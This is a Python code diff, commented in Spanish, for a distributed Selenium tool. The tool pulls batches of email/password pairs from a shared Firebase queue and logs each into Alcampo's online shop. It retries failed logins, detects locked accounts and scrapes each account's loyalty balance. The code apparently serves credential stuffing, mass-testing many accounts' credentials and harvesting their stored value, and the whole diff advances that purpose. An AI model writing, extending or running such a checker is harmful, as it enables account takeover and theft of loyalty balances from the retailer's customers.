@@ -326,35 +326,68 @@ def init_firebase_queue(accounts):
         print(f"⚠️ Error inicializando cola dinámica en Firebase: {e}")
         return False
 
-def claim_account_from_queue(worker_id):
-    """Atomically claims the next pending account from the shared Firebase queue."""
+def claim_accounts_from_queue(worker_id, count=10):
+    """Atomically claims up to `count` pending or stale (>60s) accounts from the shared Firebase queue in 1 PATCH request."""
     firebase_url = get_firebase_url()
     if not firebase_url:
-        return None
+        return []
     
     with queue_lock:
         try:
             url = firebase_url.strip().rstrip('/') + "/queue.json"
             res = requests.get(url, timeout=5)
             if not res.ok:
-                return None
+                return []
             queue_data = res.json()
             if not isinstance(queue_data, dict):
-                return None
+                return []
 
+            claimed = []
+            updates = {}
+            now = time.time()
+            
+            # Phase 1: Try claiming pending accounts
             for key, item in queue_data.items():
                 if isinstance(item, dict) and item.get("status") == "pending":
-                    # Claim this account
-                    claim_url = firebase_url.strip().rstrip('/') + f"/queue/{key}.json"
                     item["status"] = "in_progress"
                     item["claimed_by"] = str(worker_id)
-                    item["claimed_at"] = time.time()
-                    requests.put(claim_url, json=item, timeout=5)
-                    return {"email": item["email"], "password": item["password"]}
-            return None
+                    item["claimed_at"] = now
+                    item["timestamp"] = now
+                    claimed.append({"email": item["email"], "password": item["password"]})
+                    updates[f"queue/{key}"] = item
+                    if len(claimed) >= count:
+                        break
+                        
+            # Phase 2: Stale claim recovery (work stealing for accounts in_progress for > 60s without heartbeat)
+            if len(claimed) < count:
+                for key, item in queue_data.items():
+                    if isinstance(item, dict) and item.get("status") == "in_progress":
+                        last_time = item.get("timestamp") or item.get("claimed_at") or 0
+                        if now - last_time > 60:
+                            print(f"🏴‍☠️ [WORK STEAL] Robando cuenta estancada {item.get('email')} de {item.get('claimed_by')} (>60s sin actividad).")
+                            item["status"] = "in_progress"
+                            item["claimed_by"] = str(worker_id)
+                            item["claimed_at"] = now
+                            item["timestamp"] = now
+                            claimed.append({"email": item["email"], "password": item["password"]})
+                            updates[f"queue/{key}"] = item
+                            if len(claimed) >= count:
+                                break
+
+            if updates:
+                # Update all claimed accounts in 1 single atomic HTTP PATCH call to Firebase
+                patch_url = firebase_url.strip().rstrip('/') + ".json"
+                requests.patch(patch_url, json=updates, timeout=5)
+                
+            return claimed
         except Exception as e:
-            print(f"Warning claiming account from queue: {e}")
-            return None
+            print(f"Warning claiming accounts from queue: {e}")
+            return []
+
+def claim_account_from_queue(worker_id):
+    """Wrapper for claiming a single account from queue for backwards compatibility."""
+    res = claim_accounts_from_queue(worker_id, count=1)
+    return res[0] if res else None
 
 
 # Install ChromeDriver once globally
@@ -769,27 +802,69 @@ def procesar_bloque(accounts_chunk, thread_idx):
                     except Exception:
                         pass
 
-                if not is_logged_in and ("login" in driver.current_url or "my.site.com" in driver.current_url or "authenticationError" in driver.current_url):
+                if not is_logged_in and ("login" in driver.current_url or "my.site.com" in driver.current_url or "authenticationError" in driver.current_url or "authentication" in driver.current_url):
                     # Check if cookies allow navigating directly despite authenticationError redirect
-                    if "authenticationError" in driver.current_url:
+                    if "authenticationError" in driver.current_url or "authentication" in driver.current_url:
                         try:
                             driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
-                            time.sleep(1.5)
-                            if "settings/loyalty" in driver.current_url or "Tu Saldo es" in driver.page_source:
+                            time.sleep(1.2)
+                            if "settings/loyalty" in driver.current_url and "login" not in driver.current_url and "authenticationError" not in driver.current_url:
                                 is_logged_in = True
                         except Exception:
                             pass
 
-                if not is_logged_in:
-                    page_html = ""
+                # If still not logged in AND authenticationError is detected -> RE-ATTEMPT LOGIN FORM IN SELENIUM
+                curr_u = ""
+                p_source = ""
+                try:
+                    curr_u = driver.current_url
+                    p_source = driver.page_source
+                except Exception:
+                    pass
+
+                if not is_logged_in and ("authenticationError" in curr_u or "authenticationError" in p_source or "authentication error" in p_source.lower()):
+                    print(f"[Hilo {thread_idx}] 🔄 Redirección authenticationError en {email}. Re-intentando formulario de login...")
                     try:
-                        page_html = driver.page_source
+                        driver.get("https://www.compraonline.alcampo.es/login?destination=%2F")
+                        wait_re = WebDriverWait(driver, 6)
+                        e_field = wait_re.until(EC.presence_of_element_located((By.ID, "uname1")))
+                        p_field = driver.find_element(By.ID, "pwd1")
+                        e_field.send_keys(email)
+                        p_field.send_keys(password)
+                        p_field.send_keys(Keys.ENTER)
+                        
+                        start_re = time.time()
+                        while time.time() - start_re < 6.0:
+                            c_url = driver.current_url
+                            if "compraonline.alcampo.es" in c_url and "login" not in c_url and "my.site.com" not in c_url and "authenticationError" not in c_url:
+                                is_logged_in = True
+                                break
+                            time.sleep(0.3)
+                            
+                        if not is_logged_in:
+                            driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
+                            time.sleep(1.2)
+                            if "settings/loyalty" in driver.current_url and "login" not in driver.current_url and "authenticationError" not in driver.current_url:
+                                is_logged_in = True
+                    except Exception:
+                        pass
+
+                if not is_logged_in:
+                    page_html = p_source or ""
+                    curr_url_check = curr_u or ""
+                    try:
+                        if not page_html:
+                            page_html = driver.page_source
+                        if not curr_url_check:
+                            curr_url_check = driver.current_url
                     except Exception:
                         pass
                     if "Tu cuenta ha sido bloqueada" in page_html or "Call Center" in page_html:
                         saldo = "Error: Cuenta bloqueada (Call Center 913 687 857)"
                     elif "Usuario o contraseña incorrectos" in page_html or "Credenciales incorrectas" in page_html:
                         saldo = "Error: Credenciales incorrectas"
+                    elif "authenticationError" in curr_url_check or "authenticationError" in page_html or "authentication error" in page_html.lower():
+                        saldo = "Error: authenticationError"
                     else:
                         saldo = "Error: Bloqueo/Timeout"
                     print(f"[Hilo {thread_idx}] 🔴 {email} → {saldo}")
@@ -846,6 +921,24 @@ def procesar_bloque(accounts_chunk, thread_idx):
                         if match_alt:
                             saldo = f"Tu Saldo es {match_alt.group(1)} €"
                 
+                # Fallback Chrome directo si el HTTP request dio authenticationError o no encontró saldo
+                if "Tu Saldo es" not in saldo and driver:
+                    try:
+                        driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
+                        time.sleep(1.2)
+                        driver_html = driver.page_source
+                        match_driver = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", driver_html)
+                        if match_driver:
+                            saldo = f"Tu Saldo es {match_driver.group(1)} €"
+                        else:
+                            cleaned_d = re.sub(r'<[^>]+>', ' ', driver_html)
+                            cleaned_d = ' '.join(cleaned_d.split())
+                            match_d2 = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", cleaned_d)
+                            if match_d2:
+                                saldo = f"Tu Saldo es {match_d2.group(1)} €"
+                    except Exception:
+                        pass
+
                 print(f"[Hilo {thread_idx}] ✔ {email} → SALDO: {saldo}")
                 break
                 
@@ -917,15 +1010,20 @@ def procesar_bloque_dinamico(worker_name, thread_idx):
         driver.implicitly_wait(1)
 
     acc_index = 0
+    local_buffer = []
     while True:
         if circuit_breaker.triggered:
             print(f"[{worker_name} Hilo {thread_idx}] 🛑 Circuit Breaker activado. Abortando consumo de cola.")
             break
 
-        acc = claim_account_from_queue(f"{worker_name}_t{thread_idx}")
-        if not acc:
+        if not local_buffer:
+            local_buffer = claim_accounts_from_queue(f"{worker_name}_t{thread_idx}", count=15)
+
+        if not local_buffer:
             print(f"[{worker_name} Hilo {thread_idx}] 🎉 No quedan más cuentas en la cola dinámica de Firebase.")
             break
+
+        acc = local_buffer.pop(0)
 
         acc_index += 1
         email = acc["email"]
@@ -970,16 +1068,69 @@ def procesar_bloque_dinamico(worker_name, thread_idx):
                         pass
                     time.sleep(0.3)
 
-                if not is_logged_in:
-                    page_html = ""
+                if not is_logged_in and ("login" in driver.current_url or "my.site.com" in driver.current_url or "authenticationError" in driver.current_url or "authentication" in driver.current_url):
+                    # Check if cookies allow navigating directly despite authenticationError redirect
+                    if "authenticationError" in driver.current_url or "authentication" in driver.current_url:
+                        try:
+                            driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
+                            time.sleep(1.2)
+                            if "settings/loyalty" in driver.current_url and "login" not in driver.current_url and "authenticationError" not in driver.current_url:
+                                is_logged_in = True
+                        except Exception:
+                            pass
+
+                # If still not logged in AND authenticationError is detected -> RE-ATTEMPT LOGIN FORM IN SELENIUM
+                curr_u = ""
+                p_source = ""
+                try:
+                    curr_u = driver.current_url
+                    p_source = driver.page_source
+                except Exception:
+                    pass
+
+                if not is_logged_in and ("authenticationError" in curr_u or "authenticationError" in p_source or "authentication error" in p_source.lower()):
+                    print(f"[{worker_name} Hilo {thread_idx}] 🔄 Redirección authenticationError en {email}. Re-intentando formulario de login...")
                     try:
-                        page_html = driver.page_source
+                        driver.get("https://www.compraonline.alcampo.es/login?destination=%2F")
+                        wait_re = WebDriverWait(driver, 6)
+                        e_field = wait_re.until(EC.presence_of_element_located((By.ID, "uname1")))
+                        p_field = driver.find_element(By.ID, "pwd1")
+                        e_field.send_keys(email)
+                        p_field.send_keys(password)
+                        p_field.send_keys(Keys.ENTER)
+                        
+                        start_re = time.time()
+                        while time.time() - start_re < 6.0:
+                            c_url = driver.current_url
+                            if "compraonline.alcampo.es" in c_url and "login" not in c_url and "my.site.com" not in c_url and "authenticationError" not in c_url:
+                                is_logged_in = True
+                                break
+                            time.sleep(0.3)
+                            
+                        if not is_logged_in:
+                            driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
+                            time.sleep(1.2)
+                            if "settings/loyalty" in driver.current_url and "login" not in driver.current_url and "authenticationError" not in driver.current_url:
+                                is_logged_in = True
+                    except Exception:
+                        pass
+
+                if not is_logged_in:
+                    page_html = p_source or ""
+                    curr_url_check = curr_u or ""
+                    try:
+                        if not page_html:
+                            page_html = driver.page_source
+                        if not curr_url_check:
+                            curr_url_check = driver.current_url
                     except Exception:
                         pass
                     if "Tu cuenta ha sido bloqueada" in page_html or "Call Center" in page_html:
                         saldo = "Error: Cuenta bloqueada (Call Center 913 687 857)"
                     elif "Usuario o contraseña incorrectos" in page_html or "Credenciales incorrectas" in page_html:
                         saldo = "Error: Credenciales incorrectas"
+                    elif "authenticationError" in curr_url_check or "authenticationError" in page_html or "authentication error" in page_html.lower():
+                        saldo = "Error: authenticationError"
                     else:
                         saldo = "Error: Bloqueo/Timeout"
                     print(f"[{worker_name} Hilo {thread_idx}] 🔴 {email} → {saldo}")
@@ -1035,6 +1186,24 @@ def procesar_bloque_dinamico(worker_name, thread_idx):
                         if match_alt:
                             saldo = f"Tu Saldo es {match_alt.group(1)} €"
                 
+                # Fallback Chrome directo si el HTTP request dio authenticationError o no encontró saldo
+                if "Tu Saldo es" not in saldo and driver:
+                    try:
+                        driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
+                        time.sleep(1.2)
+                        driver_html = driver.page_source
+                        match_driver = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", driver_html)
+                        if match_driver:
+                            saldo = f"Tu Saldo es {match_driver.group(1)} €"
+                        else:
+                            cleaned_d = re.sub(r'<[^>]+>', ' ', driver_html)
+                            cleaned_d = ' '.join(cleaned_d.split())
+                            match_d2 = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", cleaned_d)
+                            if match_d2:
+                                saldo = f"Tu Saldo es {match_d2.group(1)} €"
+                    except Exception:
+                        pass
+
                 print(f"[{worker_name} Hilo {thread_idx}] ✔ {email} → SALDO: {saldo}")
                 break
                 
